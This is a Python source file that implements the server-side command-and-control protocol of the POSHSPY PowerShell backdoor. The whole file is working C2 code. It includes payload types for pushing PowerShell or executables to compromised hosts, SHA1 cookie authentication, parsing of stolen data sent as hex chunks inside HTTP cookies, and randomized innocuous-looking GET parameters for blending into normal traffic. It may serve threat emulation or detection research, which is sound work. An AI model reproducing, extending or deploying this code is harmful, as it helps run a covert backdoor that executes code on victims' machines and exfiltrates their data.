# poshspy/server/protocol.py
# POSHSPY C2 protocol implementation
# Source: matthewdunwoody/POSHSPY — getAuthToken, uploadChunk, checkRespCk,
#         createAuthCookieVal, uploadDataAuth, generateGetParam

import hashlib
import random
import string
import os

# Payload types — processPayload() in POSHSPY.ps1
PAYLOAD_TYPE_PS  = 0x00  # PowerShell — psPldRoutine
PAYLOAD_TYPE_EXE = 0x01  # Executable — exePldRoutine

# Response types — processPayload() return values
RESP_TYPE_PS     = 0x10  # PS output
RESP_TYPE_EXE    = 0x20  # EXE pid_filename string

# Upload chunk size — uploadDataAuth() splits on 2048 byte boundaries
CHUNK_SIZE = 2048


def sha1(data: str) -> str:
    """SHA1 hex digest. Source: getSha1Hash()"""
    return hashlib.sha1(data.encode('utf-8')).hexdigest()


def create_auth_token() -> str:
    """Generate random auth token to issue in Set-Cookie.
    Source: getAuthToken() — client reads Set-Cookie, extracts value after '='"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))


def create_auth_cookie_val(token: str, client_pass: str) -> str:
    """Compute expected auth cookie value.
    Source: createAuthCookieVal() — SHA1(SHA1(pass) + token)"""
    return sha1(sha1(client_pass) + token)


def check_resp_ck(to_check: str, base_val: str, client_pass: str) -> bool:
    """Verify client upload chunk auth cookie.
    Source: checkRespCk() — SHA1(SHA1(base_val) + pass)"""
    expected = sha1(sha1(base_val) + client_pass)
    try:
        cookie_val = to_check.split('=', 1)[1]
        return cookie_val == expected
    except Exception:
        return False


def make_resp_ck(base_val: str, client_pass: str) -> str:
    """Build Set-Cookie response for upload chunk ACK.
    Source: checkRespCk() — server mirrors this value back"""
    val = sha1(sha1(base_val) + client_pass)
    name = ''.join(random.choices(string.ascii_lowercase, k=3))
    return f"{name}={val}"


def parse_chunk_cookies(cookie_header: str, client_pass: str, token: str) -> dict:
    """
    Parse inbound upload chunk cookies.
    Source: uploadChunk() cookie construction:
      cookie = addCookieToStr(ck, auCookie)       # auth val
      cookie = addCookieToStr(cookie, dataStr)     # hex data chunk
      if tsize: cookie = addCookieToStr(cookie, tsize/2)  # final chunk marker

    Returns dict with:
      auth_val  — the auth cookie value (for ACK computation)
      data      — hex chunk string
      tsize_half — present only on final chunk (total_len / 2)
      is_final  — True if this is the last chunk
    """
    # cookies arrive as semicolon-separated name=value pairs
    pairs = [p.strip() for p in cookie_header.split(';')]
    kv = {}
    for p in pairs:
        if '=' in p:
            k, v = p.split('=', 1)
            kv[k.strip()] = v.strip()

    vals = list(kv.values())

    # auth val is always first added after base config cookie
    # data chunk is second, tsize/2 is third (final chunk only)
    # base config cookie (ckName=ckVal) comes first in the string
    # so vals order: [ckVal, auCookie, dataStr, (tsize/2)?]
    result = {}
    try:
        result['auth_val'] = vals[1]   # auCookie
        result['data']     = vals[2]   # hex chunk
        result['is_final'] = len(vals) >= 4
        if result['is_final']:
            result['tsize_half'] = int(vals[3])
    except (IndexError, ValueError):
        return {}
    return result


def hex_to_bytes(hex_str: str) -> bytes:
    """Reverse of prepareDataSend() — BitConverter hex back to bytes"""
    return bytes.fromhex(hex_str)


def generate_get_param(count: int) -> str:
    """Random GET params. Source: generateGetParam()"""
    known = ['id','s','session','user','uid','ssid','data',
             'search','str','query','filter']
    names = set()
    for _ in range(count):
        if random.randint(0,1):
            names.add(random.choice(known))
        else:
            names.add(random.choice(string.ascii_lowercase))
    while len(names) < count:
        names.add(random.choice(string.ascii_lowercase))
    
    parts = []
    for name in list(names)[:count]:
        length = random.randint(4, 20)
        val = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        parts.append(f"{name}={val}")
    return '&'.join(parts)